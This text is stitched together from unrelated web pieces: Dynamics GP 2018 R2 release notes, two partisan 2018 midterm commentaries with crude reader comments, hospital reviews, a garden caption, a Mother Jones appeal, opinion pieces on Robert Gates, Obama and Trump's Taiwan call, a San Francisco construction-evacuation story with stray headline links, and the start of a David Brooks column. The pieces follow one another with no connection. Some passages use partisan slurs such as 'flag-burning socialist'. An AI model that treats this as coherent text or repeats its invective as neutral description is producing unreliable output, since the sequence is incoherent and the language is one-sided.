Changes in this area affect the FICA totals with the payroll check register report which are important to be aware of if you use HR and payroll functions of GP. The report now has two new calculated fields of FICA totals. One is FICA Medicare, which is the sum of Employee FICA Medicare total and Employer FICA Medicare. The second is FICA Social Security which is the sum of Employee Social Security total + Employer Social Security total. Prior versions of Dynamics GP totaled employee and employer Medicare separately. If you are using a modified version of this report then you may have reset security back to the original report to see the new fields.
Another significant feature change is the allowance of start and end dates for pay codes. Previously the restriction of pay codes required manually inactivating them to be excluded from a pay run which can be a hassle, especially if forgotten. With the addition of start and end dates, the active range of pay codes can be set at the time of creation and/or updated when decisions are made on their active time. There is specific logic for GP handles the setting of the new start and end date fields so it’s important to review how setting these will impact your organization. Details on this are available on Microsoft’s website at https://docs.microsoft.com/en-us/dynamics-gp/whats-new/version-2018-r2.
The final enhancement in this area is the ability to set shared calendar year maximums on group benefits and deductions. This enhancement is intended for organizations with employees who contribute to multiple 401K plans and should greatly help in managing these.
When this feature is used the amounts in the pay run will show on the Build Checks report. In order to calculate the pay run for the annual maximum, GP will apply TSA deductions- first in priority order, then full deduction amounts for sequenced deductions, and lastly all non-sequenced/non-TSA deductions in alphabetical order.
New Sales Approval Workflow
A new Sales Transaction Approval workflow has been added that allows you to create approvals for various transaction types based on conditions such as customer credit limit. As with other workflow types, a new email message has been added with it along with the tracking and displaying of the workflow history in the inquiry form.
Financial Enhancements
Several enhancements have been added in the areas of finance. One to be most aware of is a new checkbox option for recurring monthly or bi-monthly batches to use last of day of the month for receivables, payables, and inventory batch entry. When selected the posted date will be automatically set to the last day of the month for accounting months with 28, 30, or 31 days.
One important thing to note with this is when this option is enabled for the first time, the document date on the transactions will be the current users GP date (shown in the bottom left corner). If this is not desired, then the document dates must be updated in the Transaction Entry window to match the posting date.
The next enhancement adds additional options to the HITB report to determine if items with zero quantity or zero value are included in the report. These options are set by selecting Inventory under the Reports menu and then selecting Activity to bring up the Inventory Activity Reports Options window shown below.
The third financial enhancement allows posting through the G/L at the transaction level in many of the financial window. The option to enable this enhancement has been added to the Posting Setup window. shown below:
The next enhancement adds the ability to bulk-update master records as active or inactive in navigation lists. Options with the names Inactivate and Reactivate have been added to the Modify section of the Accounts Navigation List, Checkbooks Navigation List, Customers Navigation List, Salespeople Navigation List, Vendors Navigation List, Items Navigation List, and Employees Navigation List window. The options become available when multiple records of the same state are selected.
Finally, the last two enhancements add options to allow or prevent duplicate checking numbers for checkbooks other than Payables Checks, and a setting to control if inactive checkbooks appear in checkbook lookup windows.
Purchasing Enhancements
A significant change in purchasing is you can now enter a quantity below the total requested when creating a purchase order and thus perform a partial purchase. When this is done, the remaining quantities on the requisition are cancelled and the amounts ordered and cancelled noted in the history and the requisition status set to Partially Purchased.
Three other enhancements were added. First, the Purchasing All-in-One View will now show the Applied-To Document Number associated with payments, returns, and credit memos. The second enhancement allows sending purchase order emails using different templates. The third adds a warning popup for vendors on hold when entering a payables transaction.
System Enhancements
Two system enhancements have been made to Dynamics GP 2018 R2 regarding passwords. First, user passwords may now be 21 characters long, up from the previous limit of 15. The second update allows for 7 days advance notification of password expiration.
System administrators may now turn off the Business Analyzer for the Home Page and/or navigation lists at the system level. This is useful if your company does not use this feature and you want to globally prevent it from appearing for all users. The new option for this is available in the system preferences window. The ability to selectively enable or disable Business Analyzer on a user basis remains available.
The Home Page will now have a new tab named Intelligent Cloud Insights which allows for connecting Dynamics GP to a Dynamics 365 Business Central cloud tenant for data synchronization. When upgrading, the default home page will remain unchanged and simply display a new tab for Intelligent Cloud Insights. New Dynamics GP installations will use Intelligent Cloud Insights as the home page default. You can find out more about this feature at https://docs.microsoft.com/en-us/dynamics365/business-central/dev-itpro/administration/faq-intelligent-cloud.
The final enhancement in this area is any SmartList Favorites created in the SmartList designer will now appear in the SmartList Favorites navigation lists.

The massive tsunamis predicted by both Republicans and Democrats for the 2018 midterms petered out early with no giant waves of any hue crashing the shores of America. As expected, the United States House of Representatives flipped to Democrats, with a few extra seats than needed, but the Senate went a deeper shade of red, entrenching their majority powers.
History repeated the typical shift in the balance of power. In 36 out of 38 midterm elections held since the Civil War ground to a close, the sitting president’s party has lost seats in the House.
But what isn’t electorate business, as usual, is when the president’s party makes gains in the Senate. After the 17th Amendment was adopted in 1913, authorizing the popular vote for the U.S. Senate, the president’s party has lost seats in 19 out of 26 elections.
Stacey Abrams
Squeakers
As the midterm approached, The Donald, Vice President Mike Pence, former president Barack Obama, also-ran Hillary, and billionaire Oprah stumped across the country to sway the vote.
Trump saw hundreds of thousands of stalwart fans wherever he went – a mirror image of his 2016 campaign — but the House was lost. Obama, Hillary, and Oprah basked in the adoration of hundreds of fans but lost vital Senate seats and governorships.
The uprising in Georgia over the flag-burning socialist candidate for governor, Stacey Abrams, heavily campaigned by Obama, Hollywood types, and Oprah, failed to defeat Republican Brian Kemp. But in true delusional Democrat style, Abrams refuses to concede, citing the need to wait for absentee votes to be counted.
The other squeaker of note is the downfall of Florida’s Tallahassee mayor, who wished to be governor, Andrew Gillum. By an 80,000-vote difference, Gillum was summarily deposited into obscurity – for the time being – as Republican Ron DeSantis scratched and clawed his way to the highest office in the state. At least Gillum had the good graces to concede.
Sinkers
Not unsurprisingly, Senator Claire McCaskill (D-MO) was handed her pink slip. Whether her 2012 election was a fluke or the electorate was incensed by the Project Veritas’ hidden show-and-tell undercover video, the Show Me State soundly rebuked their incumbent for Republican Josh Hawley – a solid six-point victory.
And these folks deliver surprise after surprise…
And the other freak election of 2012 finally remedied was, of course, Republican Mike Braun handing Senator Joe Donnelly (D-IN) his loss in Indiana. With 59% of precincts tallied and Braun with a cushy 10-point lead, Donnelly bowed out with a two-minute concession speech to his people.
So much for pollsters and their mouthpieces in the media calling the matchup “too close to call.”
Surprises
This is America. Home to a quirky electorate, who, it appears, will stay loyal and faithful to the candidate of the choosing regardless of the hurdles and heartaches they face. And these folks deliver surprise after surprise, dumbfounding the political elite with impunity.
The winner, hands-down, of Election 2018 Biggest Surprise is none other than Nevada’s 36th Assembly District victor, Dennis Hof.
Hof, a brothel owner and reality TV star, who fashioned his political persona after President Donald Trump, defeated Democrat educator, Lesia Romanov.
Hof is also dead. Underground. Pushing up daisies. The good news for his constituency is that a Republican will be appointed to fill the position. How embarrassed is Romanov? Beaten twice by a dead man who wrote “The Art of the Pimp” and starred in the HBO reality series, Cathouse?
Perhaps she will channel Hillary, and fade away into the woods, mumbling “At this point, what difference does it make?”

If the dead brothel owner, winner of the seat he was running for, posthumously, was married wouldn’t his spouse be the one to take the office.
If there was justice at all, his spouse would be one of his hookers and totally bodacious.
Yes, I, too am LMAO over that election. The opposition surely needs to find another line of endeavor.

President Donald Trump’s most loyal supporters had begun to think the Republicans might just hold on to their majority in the House of Representatives, even if only by the skin of their teeth. The hardest of hardcore deplorables – a moniker they rightly consider a badge of honor – even believed the 2018 midterm elections could bring a red wave. They were wrong, but the night of November 6th was by no means a repudiation of the Trump agenda, as the president’s foes firmly believed it would be. While they now control the House of Representatives until 2020, the Democrats failed on two fronts and these two failures must shape how they conduct business in the House if they expect to carry their majority into 2021.
Barack Obama
Two years into a new president’s first term, the party loses big in the midterm elections. This is a historical truth with very few exceptions. Bill Clinton’s Democratic Party lost more than 50 seats in the House. In Barack Obama’s first term, his party suffered what he himself described as a “shellacking,” losing more than 60 seats to the Republicans. Donald Trump saw his party lose control of the House, in line with historical trends, but – with less than 20 House races still to be decided – it appears Democrats will flip a total of fewer than 40 seats; a comparatively small defeat. As a consolation, the Republicans expanded their Senate majority. With three races still too close to call, Republicans have 52 seats and are well-placed to win all three outstanding contests.
Anti-Trump Sentiment Overestimated
Factor in the unusually high number of GOP retirements. Add to that the herculean efforts of a massive anti-Republican machine, comprising most of the national media, social media giants Google, Facebook and Twitter, an array of celebrities, and a few prominent left-wing billionaires. The scale of the Democrats’ failure in this midterm election begins to look quite remarkable. Yes, they took the House, but they really should have taken it by a margin of 80 or more seats, if they had been correct in their own assumptions.
The main assumption Democratic Party leaders have made and held on to since January 2017 is that most Americans despise the president and would flock to the polls to defeat his party at the first opportunity. Such thinking gave rise to expectations of a ‘blue wave’ that failed to materialize on election night. While they did capture a few seats which Republicans should have held, the results proved, above all else, that the urban blue strongholds of the northeast and west coast are becoming even bluer. Outside of the country’s deepest blue districts, those Democrats who did unseat incumbent Republicans did so by campaigning on issues most likely to appeal to Democrat or Democrat-leaning voters, rather than on anti-Trump and anti-Republican rhetoric.
They mistakenly believed they could export their most radical leftist ideas to certain red states, and so they failed.
Red States Reject Progressives
Another key lesson for Democrats should be that radical left-wing ideology does not play well outside of the blue states. Highly-promoted progressive candidates continue to lose in red states despite truck-loads of money being poured into their races from across the U.S. In Texas, Robert Francis “Beto” O’Rourke failed to unseat Republican Senator Ted Cruz, despite the best efforts of Democrats and big-money left-wing groups. In Florida, Tallahassee’s extremist mayor, Andrew Gillum, was unable to beat Ron DeSantis in the gubernatorial race. Stacey Abrams, for whom the left pulled out all the stops – including an Oprah rally – was unable to win the Georgia gubernatorial race. The only celebrated progressive candidate to win their race was Alexandria Ocasio-Cortez, but she ran for office in a safe New York district – hardly an accomplishment.
Alexandria Ocasio-Cortez
Democrats, it seems, have strengthened their hold on the country’s blue states. They mistakenly believed they could export their most radical leftist ideas to certain red states, and so they failed. Progressivism, it is clear, has not made much progress beyond the more densely-populated urban places, which are already Democratic Party strongholds. All eyes are now on the party to deliver something positive in Congress. In order to avoid a crushing defeat in 2020, Democrats must fulfill the promises they made to their voters and legislate, rather than obstruct and litigate.
Democrats should have learned two lessons from November 6th: that an anti-Trump agenda, devoid of any substantive policy solutions, is not enough, and that a very large part of the country does not care for either progressive rhetoric or progressive policies. Well before the 2020 campaigning begins, the nation will know whether the Democrats have learned these lessons.

It's a great organization to work for. All the employees are very helpful and caring towards the community in which they serve. My family and I come here to get our care and as a patient we received excellent treatment from the staff.

I recently visited the hospital with my son. We were greeted by a very friendly and helpful gentleman that helped us thru the check in process. We were promptly taken back to the ER, treated and released within a very reasonable amount of time. The staff was very professional and answered all of my questions and concerns.

Horrible experience!!! I only gave it one star because i had to. It technically deserves 0!! They discriminate against people with Medicaid! So much so that when you call to set up an appointment with a primary care dr the first question is “what kind of insurance do you have?” And because i said Medicaid i was told “the primary care physicians aren’t accepting any patients with Medicaid.” The nerve! This place is a joke. They don’t actually care about your well being. They just want money!

I have been working for SBPH for three years now and I could not ask for a better place to work and serve our community. I am born and raised from St. Bernard Parish. Being able to provide top quality healthcare to my community gives me such joy. It's a pleasure to be able to work for a healthcare system that truly puts patients first. I am so proud to be apart of such a hard-working, dedicated team!

I've been employed at St. Bernard Parish Hospital for three years and I can honestly say that being a resident of St. Bernard Parish, this place feels like home. I've worked in the medical offices building primarily with brief stints in the hospital portion of the facility and everywhere I go people greet me with a smile and a "how are you?" Having known many of the nurses and doctors both professionally and personally, I can say that your care is of the utmost importance to them. Nothing gives them more pleasure than seeing a patient that's been admitted to our hospital through our emergency department, get discharged in a timely manner with their issues resolved. I will continue to work here and help the people of St. Bernard Parish as long as I can.

This is a lovely bearded iris in Marian’s garden. By the laws of community property in the state of California, it’s my garden too, but seriously folks, we all know whose garden it is. When it comes to gardenology, I rank #4 among the critters who call this place home.

TELLING IT LIKE IT IS.
The Mueller report might not say it, but David Corn will. So amid the swirling headlines and cable chatter, David provides a clear and honest assessment of what we really know about Trump's actions: “Trump Aided and Abetted Russia's Attack. That Was Treachery. Full Stop.”
Even though Mueller may be done with his investigation, Mother Jones is not. David and his team in Washington have been digging deep on the Russian connections and other corruption scandals since before the 2016 election, and we're not stopping now. If you agree there's more to dig into and expose, please help our team do it with a tax-deductible donation today.

Secretary of Defense Robert Gates went before Congress Thursday to defend the President’s escalation of the Iraq War. He probably wishes he had some of his testimony back.
Trying to downplay the risk that Bush’s decision will prolong the war, Gates said, “I think most of us, in our minds, are thinking of it as a matter of months, not 18 months or two years.” This, of course, is a haunting echo of many statements made by Bush and Co. before the war. Examples from the Mother Jones Iraq War Timeline:
“Five days or five weeks or five months, but it certainly isn’t going to last any longer than that.” — Donald Rumsfeld, November 14, 2002
“It could last, you know, six days, six weeks. I doubt six months.” — Donald Rumsfeld, February 7, 2003
“We’re going to stand up an interim government, hand power over to them, and get out of there in three to four months.” — Lawrence Di Rita, April 2003
Gates took a beating at the hearing, attacked by both Republicans and Democrats over the war in Iraq. At one point, under intense questioning, Gates actually said, “I would confess I’m no expert on Iraq.” (I would confess, from the looks of things, no one in the Bush Administration is.) Later, when asked about the balance between American and Iraqi troops, Gates provided what might be the greatest soundbite from a Secretary of Defense ever.
He told the panel he was “no expert on military matters.”
Clearly, this is the most qualified man in America to run the Armed Forces at this trying time.

Obama has built a legacy, all right: appeasement, staggering debt, racial animosity . . .
President Obama last week spiked the ball on the Supreme Court’s decisions to legalize gay marriage and to ratify the Affordable Care Act.
Yet it is difficult to see quite how Obama had much to do with these decisions — or, to the degree he did, that they are earth-shattering. He twice ran for president expressing opposition to gay marriage while emphasizing the religious element of holy matrimony, which, he argued, precluded same-sex marriages. Is he delighted that the Court ignored his prior views?

On the Obamacare front, all the Supreme Court did was to clean up the Affordable Care Act, in a postmodern ruling that the administration’s poorly worded law actually meant something other than what the text as written actually said. The Court’s intervention was an act of partisan salvation, not disinterested legal reasoning.
Obama’s trade pact passed only with Republican votes. Apparently free-traders in Congress wanted the deal more than they worried about the president’s taking credit for their eleventh-hour rescue of what otherwise would have been a strong rebuke from his own party.

Nonetheless, Obama still talks of his “change” legacy, as if altering something necessarily meant improving it. Pulling all U.S. peacekeepers out of Iraq certainly changed the dynamics there, as ISIS can testify. The current talks with Iran will change Iranian ideas about how best to get the bomb. Normalizing relations with Stalinist Cuba also changes — as in increases — that regime’s viability.
Jimmy Carter was asked to evaluate President Obama’s foreign-policy record. He concluded that it was hard to identify any improvement in our relations with any nation since Obama took office, defining change as change for the worse. Carter for once is probably right. Some of our outright enemies — Vladimir Putin, for example — have changed by showing even more contempt for us than they did in 2008, apparently on the Munich pattern that appeasement wins, not praise for magnanimity, but rather contempt for obsequiousness. Hitler, remember, vowed to stomp on his benefactor, Neville Chamberlain, after the latter gave him what he wanted in 1938. “Worms,” the Führer scoffed of his appeasers.

Iran so far has repaid Obama’s indulgence by blowing up a mock U.S. aircraft carrier in military drills, de facto running affairs in three other Middle Eastern states — Lebanon, Syria, and Yemen — and brazenly renouncing almost all the basic elements of prior nonproliferation understandings, from on-site inspections to cessation of enrichment to kickback sanctions in the event of noncompliance. Iran embraces change, and looks forward to a nuclear future.
Apparently, the theocracy sees Barack Obama and John Kerry as hell-bent changers, willing to achieve their own legacies at the expense of the interests of their country and its allies — and thus as bewildering and worthy of contempt in a world where leaders are expected to promote their own people’s interests. Expect the geriatric Castros to share the same contempt for American outreach, and to double down on their anti-Americanism and their ruthless suppression of freedom to add spite to the embarrassment of U.S. appeasement. They see U.S. recognition as a big change that will further empower their police state.
What allies we have left in the Middle East seem either tired of the U.S. change or baffled by it.
What allies we have left in the Middle East seem either tired of the U.S. change or baffled by it — especially Israel, Jordan, the Gulf monarchies, and Egypt. All that can be said for a changing U.S. foreign policy is that our friends see the Iran deal as a framework for changing ideas about their own nuclear acquisition — on the logic that the institutionalization of American nonproliferation models makes it fairly easy for anyone to get a bomb. Not since Israel got the bomb has any other ally or friend of the United States gone nuclear. (China, India, Pakistan, and North Korea were hostile to the U.S. at the time of their nuclear acquisitions.) Obama may well change that trend too, as we see all sorts of former allies and friends. both in the Middle East and in the Pacific region. creeping toward becoming nuclear powers — fearing either that they are no longer protected by the U.S. or that, on Obama’s watch, too many crazy neighbors may go nuclear.

Our friends have come to resent American change, especially the Obama administration’s sense of self-righteousness that judges partners on impossible standards that it does not apply to enemies or neutrals, such as Iran, Hamas, and the Palestinian Authority. Obama’s smugness turns old allies off — as by defining ISIS as a jayvee organization, or psychoanalyzing Putin as a class cut-up bent on a macho shtick when he gobbles up neighboring countries, or lecturing Israel on Obama’s rare insight on what is really in the Jewish state’s self-interest.

If one wants an exemplar of change-failure, then look to Iraq or Libya. The abrupt pullout of all U.S. peacekeepers changed postwar Iraq, just as, if we had left Kosovo in 2001 or South Korea in 1955, the result would have been utter chaos. The logical outcome of bombing Libya without worry about what would follow on the ground was ISIS’s beheadings and “what difference does it make?” lies about Benghazi. Libya and Iraq are the faces of change.
The Europeans are flummoxed. Why that is so is another Obama lesson. In just six years, Obama’s defense cuts, his recessional from world leadership, and his abdication of a strong presence in the volatile Middle East — in other words, a changed foreign policy reminds our EU and NATO allies to be careful of the change you wish for. Socialist pacifism in Europe was always predicated on the presence of America’s friendly free-market military muscularity. What the Europeans wanted was not change but the continuance of an America quite unlike themselves, willing to subsidize their indulgences and to serve as a scapegoat for their fits of envious venting. Instead, they got a president who is a fellow democratic socialist who likewise believes in reducing Western military power and influence. Now they are baffled if not terrified about their wishes for change coming true.

RELATED: The Worst Agreement in U.S. Diplomatic History
By bringing this about, Obama reminds us that European anti-Americanism was mostly a psychological tic, arising from dependency and a sense of inferiority — and always predicated on strong U.S. military and political leadership contextualizing European angst.
Obama, in truth, is not much interested in Europe, ancient or modern. For him, it is not the cradle of a singular Western civilization that brought consensual government, freedom, and rationalism into the world, but a once imperial and colonialist incubator of race, class, and gender oppression, quite dependent on the underappreciated discoveries and genius of the Islamic world. Why a bunch of privileged foreigners thought that their sophistication and traditions might win them exemption from an administration bent on exposing privilege and ensuring fairness is perplexing. In the eyes of the Obama administration, Europe is to the rest of the world what the 1 percent at home is to the 99 percent — a “you didn’t build that” elite in need of some Obama redistribution of power.
Obama’s most notable change legacies at home are debt, indifference to the law, and racial polarization. He is on schedule to have borrowed more money than all previous presidents combined. Debt can trump the gift of record U.S. oil production, which came about despite, not because of, Obama. Debt can hamper even natural recoveries from recessions. Debt can nullify the stimulus of endless near-zero interest rates.
Obama has taught us that the government can slash defense spending, hike income taxes, and still end up with half-trillion-dollar annual deficits, in a way unthinkable under the old Gingrich–Clinton paradigm of budgetary compromise. For the next two decades, American presidents will be paying down what Obama has squandered through jacking up social spending and not addressing entitlement and tax reform. Let us pray for continued near-zero interest rates — the only thing that will have allowed Obama to reach $20 trillion in national debt by 2017 without a Greek-like implosion. Obama’s changes have managed to make the deficit-spending George W. Bush administration seem fiscally timid.

RELATED: Disasters at Home and Abroad
Obama does not much care for settled law. For him, enforcement of statutes hinges on the election cycle. Once there would be no more referenda, then Obama simply started interpreting immigration law or health-care mandates as he has seen fit. In theory, the next president could more or less do what he pleases, given that the media are on record that they have no objections to a president’s simply ignoring legal statutes. Not since Richard Nixon has a president so predicated enforcement of the laws on political expediency.
Not since Richard Nixon has a president so predicated enforcement of the laws on political expediency.
Little need be said about racial relations. They have changed too. Here the Obama legacy is twofold: The president has editorialized on the nation’s racial fault-lines, both trivial and fundamental — from the Professor Gates psychodrama to Trayvon Martin and Ferguson — and usually gotten it quite wrong. No other president would take the case of a Harvard professor being arrested for trying to break into a locked house (in fact, it was his own house, and he was quickly released) and turn it into a national metaphor for racist, stereotyping police. Nor would any other president use his sense of racial solidarity with the victim of a shooting to editorialize about an ongoing capital trial, or traffic in mythologies like the “hands up, don’t shoot” Ferguson fiasco, or claim that one deranged racist killer is proof that white America is still racist in its DNA. After nearly seven years, we know the Obama racial paradigm: Quite wealthy and privileged elites will lecture the members of the struggling middle class on their inherent “white privilege,” while the crises in the black community — high urban crime, escalating black-on-black murdering, epidemics of illegitimacy, drug use, and family disintegration — remain taboo subjects, given the need for record minority turnout and block voting at the polls. No president since Woodrow Wilson has so set back racial relations.
RELATED: More, More, More Spending, Obama Urges

Obama also has reminded us that “big government” is by nature incompetent and scary, given that the larger and more politicized it becomes, the more it will be bored with its assigned tasks. A growing government is a parasite whose reason to be is to expand at the expense of its host. Hiring people, not auditing what they do, is now the federal government’s aim.
Comments	
Try a thought experiment about changes in government. Say “the ______ under Obama” and then fill in the blank with what follows: IRS, VA, NSA, GSA, EPA, TSA, DHS, ICE, Secret Service, NASA. Have these agencies “changed” and do we have more “hope” because of their evolution? Are any of these bureaucracies more transparent or efficient than in 2008? Do we associate their directors with skilled and honest leadership? Or do we see these alphabet soups corrupted by cronyism and politics, immune from audit and accountability, led by incompetents, and now mostly social-welfare organizations bent on patronage and redistributive engineering?
All this may be “the face of change,” but change is a neutral term that can be as calamitous as it once was welcomed.

High-Rise Emergency: SoMa Construction Site Secured; Evacuations Lifted
Evacuations were lifted late Wednesday night in San Francisco's South of Market neighborhood after fire officials confirmed a concrete wall on the 30th floor of a skyscraper under construction was no longer in danger of collapsing. Jean Elle reports. (Published Wednesday, Feb. 15, 2017)
Evacuations were lifted late Wednesday night in San Francisco's South of Market neighborhood after fire officials confirmed a heavy piece of equipment on the 30th floor of a skyscraper under construction was no longer in danger of collapsing.
Firefighters in the afternoon ordered evacuations from 16 buildings while they responded to and investigated reports of an unstable structure on top of the building at 41 Tehama St.
Companies Working on Tehama Site Have History of Violations
Neighboring sites at 543, 531, 527, 505, 547, 555, and 557 Howard Street, 44 Tehama Street and 235 Second St. were also asked to evacuate as a precaution.
All the evacuations were lifted except at 41 Tehama, officials said.

A crane and pump sitting on top of the structure in question caused concerns about its stability.
"We were able to determine the crane was not affected, but the pumping station was affected," fire spokesman Jonathan Baxter said.
1 Dead, 5 Injured in San Francisco Shooting
Crews worked for three and a half hours Wednesday night to stabilize and level out the platform to be sure the 19,000-pound pump remains in place.
Fire officials at an earlier news conference said city engineers and building construction crews had secured the structure. In addition, fire officials said there was no imminent threat to the public.

"During the process of normal construction in a high-rise building, a platform was shored up and held in place with some struts — one of the struts in the northeast corner had failed, and when that failed, the platform itself leaned at a 15 degree angle," explained Assistant Fire Chief Tom Siragusa. Construction crew contacted SFFD, who ordered the evacuations based on the preliminary information. Siragusa said crews will be working to secure the unstable platform. Once the platform is stabilized, crews will be working to lower a heavy pump sitting on top of it.
"Our number one concern was the workers and public safety," he said. 'We erred on the side of caution."
Health Advisory Lifted After Emissions From Benicia Refinery
Fire officials initially reported an unstable concrete slab on the 30th floor of the building, which they said weighed around 2,000 pounds.
But a statement from Hines and Invesco Real Estate, the developers for 41 Tehama, which is now being advertised as 33 Tehama, said the concrete slab was not in any danger of falling:
Mueller Finds No Collusion, Stops Short of Exonerating Trump
"This afternoon, an incident occurred at the 33 Tehama site between levels 35 and 36 where an interior forming system had a partial hydraulic failure while being raised to the next level. The interior forming system and the concrete placement arm have been secured and are being evaluated by engineers to bring it back to level.
No injuries and or damage has been reported.

Please note the boom is located in the center of the top level. This is not the crane attached to the outside of the building. Previous reports that a 2,000 pound slab of concrete is in danger of falling are also false."
Hines is also listed as one of the developers of the nearby Salesforce Tower, which is being built adjacent to the Transbay Transit Center in San Francisco, and is projected to become the second tallest building on the West Coast.
CA Woman Among Passengers Evacuated From Norwegian Ship
According to its website, 33 Tehama is a 37-story, 403-unit luxury residential tower, also near the Transbay Transit Center site. It began construction in 2015, according to a 2015 statement from the contractor Lend Lease. The project is designed by Arquitectonica and will feature a fitness center, clubroom, rooftop solarium, outdoor terrace, and ground-floor retail/art space.
A permit application for the construction project, which was filed in 2015, lists the cost of the project at $106,869,000.
In January 2016, a contractor called Pacific Structures Inc. filed a permit application for a tower crane to work on new construction at 41 Tehama. The estimated cost was $100,000. The contractor for the actual construction permit is Bovis Lend Lease, Inc.
Records from the Office of Safety and Health Administration, from the U.S. Department of Labor, reveal both Bovis Lend Lease and Pacific Structures have a history of violations.
San Francisco Fire Department Assistant Chief told reporters at a news conference that if the concrete slab fell down, there would be damage to nearby buildings. The California Highway Patrol closed down the Fremont Street offramp as a precaution. An engineering expert will be flying in from Washington to investigate the situation. Multiple agencies, including the San Francisco Municipal Transportation Agency, San Francisco Police and CHP assisted SFFD with the high-rise emergency.
Those working at nearby buildings that were evacuated tweeted out photos from the scene. Conor Murphy, who works at the shared office space, Galvanize, tweeted: "When @galvanize gets evacuated for an issue with a nearby building, class continues in the street!"
Scott Manley tweeted out photos of crowds and law enforcement officials gathering outside on the street as news of the evacuations broke around 3:30 p.m.
"Our office was just evacuated because the 33 Tehama crane might fall," tweeted David Spinks who works at the LinkedIn building on 222 2nd St.

The Real Risk Behind Trump’s Taiwan Call
By Evan Osnos
December 3, 2016
The Taiwan call is the latest indicator that Trump the President will be largely indistinguishable from Trump the candidate.
Photograph by Evan Vucci / AP
If you work in foreign affairs, you learn that a highly unexpected event is often the result of intent or incompetence. (You also learn that what looks, at first, like intent often turns out to be incompetence.) In the Donald Trump era, we may need a third category—exploitation—which has elements of both.
In his first semiofficial act of foreign policy, President-elect Trump, on Friday, lobbed a firework into the delicate diplomacy of Asia by taking a phone call from Taiwan’s President, breaking thirty-seven years of American practice in a way that is sure to upset relations with China. It wasn’t clear how much he intended to abruptly alter geopolitics, and how much he was incompetently improvising. There is evidence of each; in either case, the way he did it is very dangerous.
Some background: Taiwan broke away from mainland China in 1949, and the two sides exist in a tense equilibrium, governed by decades of diplomatic agreements that serve to prevent war in Asia. Under that arrangement, the U.S. maintains friendly relations with Taiwan, while Presidents since Ronald Reagan have deliberately avoided speaking directly with Taiwan’s President because the U.S. formally recognizes only the Beijing government.
When news broke of Trump’s phone call with Taiwan’s President Tsai Ing-wen, foreign-policy experts were, unsurprisingly, appalled. Since his election, Trump has conducted a series of phone calls with foreign leaders, without seeking expertise from those at the State Department and the National Security Council who monitor the details of those relationships. On Wednesday, he told Pakistan’s President that he would do whatever he could to help him—despite America’s strong interest in preventing Pakistan from doing many things it would like to do in India and Afghanistan. To use an analogy that Trump would recognize, it’s akin to arriving for a negotiation without first asking the value of the assets, the cost of the transaction, or the previous terms of engagement.
The problem, in this case, is far more about the manner of Trump’s move than the substance of it. One can make a credible argument for seeking to improve relations with Taiwan and for pushing Beijing to reduce its effort to isolate it. Though expert reaction to the Taiwan call was generally negative, the move was applauded by a subset of conservative Asia specialists who have long pushed for the U.S. to draw closer to Taiwan as a check on China’s expanding power. Daniel Blumenthal, a China specialist at the American Enterprise Institute who has no connection to the Trump team, told me it was a “good move by Trump” that is “both morally and strategically correct.” “They are being isolated, and it is smart policy to not allow that. Everyone, including Beijing, benefits from high-level [U.S.] communication with Taiwan . . . Our thinking on this issue is so outdated.”
When Trump discovered that he was being mocked for taking the call, he tweeted what he seems to have thought would be a mitigating explanation: “The President of Taiwan CALLED ME today to wish me congratulations on winning the Presidency. Thank you!” If he meant to imply that the incoming call was a surprise, then he either was lying or had been misled; Taiwan’s press had already published news of a “scheduled” call hours earlier. The Taipei Times reported, “Trump reportedly agreed to the call, which was arranged by his Taiwan-friendly campaign staff after his aides briefed him on issues regarding Taiwan and the situation in the Taiwan Strait, sources said.”
In the hours that followed, it became clear that Trump may have been manipulated into doing something he doesn’t understand. Michael Crowley, of Politico, noted that the former U.N. Ambassador John Bolton, who favors a tilt away from Beijing, visited Trump Tower on Friday for undisclosed reasons. Bolton has argued for “playing the Taiwan card” to pressure Beijing. In a January op-ed in the Wall Street Journal, he wrote,
The new U.S. administration could start with receiving Taiwanese diplomats officially at the State Department; upgrading the status of U.S. representation in Taipei from a private “institute” to an official diplomatic mission; inviting Taiwan’s president to travel officially to America; allowing the most senior U.S. officials to visit Taiwan to transact government business; and ultimately restoring full diplomatic recognition.
Further complicating matters, according to the blog Shanghaiist, Trump and his family are currently trying to win a lucrative contract with a Taiwanese city: “A representative from the Trump Organization paid a visit to Taoyuan in September, expressing interest in the city’s Aerotropolis, a large-scale urban development project aimed at capitalizing on Taoyuan’s status as a transport hub for East Asia, Taiwan News reports.” Did Trump break nearly four decades of diplomatic practice to sweeten his family’s business prospects with Taiwan? His supporters, of course, say no. But the President-elect has taken no steps that would defuse that perception.
How will Beijing react? Outwardly, it could muster a response anywhere on the spectrum from furious to mildly annoyed. Initially, facing the risk of a costly confrontation, it chose the latter. China’s foreign minister, Wang Yi, downplayed the Trump-Tsai call as a “small action” that will not change the bedrock of the “One China” policy. (And if you believe that response, you deserve a job in the Trump Administration.)
Whether it says it or not, China will regard this as a deeply destabilizing event not because the call materially changes U.S. support for Taiwan—it does not—but because it reveals the incoming Presidency to be volatile and unpredictable. In that sense, the Taiwan call is the latest indicator that Trump the President will be largely indistinguishable from Trump the candidate.
Trump has also shown himself to be highly exploitable on subjects that he does not grasp. He is surrounding himself with ideologically committed advisers who will seek to use those opportunities when they can. We should expect similar moments of exploitation to come on issues that Trump will regard as esoteric, such as the Middle East, health care, immigration, and entitlements.
For a piece I published in September, about what Trump’s first term could look like, I spoke to a former Republican White House official whom Trump has consulted, who told me, “Honestly, the problem with Donald is he doesn’t know what he doesn’t know.” It turns out that is half of the problem; the other half is that he has surrounded himself with people who know how much he doesn’t know. Since Election Day, Trump has largely avoided receiving intelligence briefings, either because he doesn’t think it’s important that he receive them or because he just doesn’t care about them. George W. Bush, in the first months of 2001, ignored warnings about Osama bin Laden. Only in our darkest imaginings can we wonder what warnings Trump is ignoring now.

Republican or Conservative, You Have to Choose
By David Brooks

President Trump at the Conservative Political Action Conference in February.CreditCreditTom Brenner/The New York Times
The never-Trumpers are having an interesting debate over the question, Is it time to leave the Republican Party? George Will and Steve Schmidt say yes: The Trumpian rot is all the way down. Bill Kristol says not so fast: Once Donald Trump falls, the party could be brought back to health, and the fight has to be within the party as well as without it.
My instinct is that we can clarify this debate by returning to first principles. Everybody in the conversation is conservative. Where do conservative loyalties lie? How can we serve those loyalties in these circumstances?
Conservatism, as Roger Scruton reminds us, was founded during the 18th-century Enlightenment. In France, Britain and the American colonies, Enlightenment thinkers were throwing off monarchic power and seeking to build an order based on reason and consent of the governed. Society is best seen as a social contract, these Enlightenment thinkers said. Free individuals get together and contract with one another to create order.
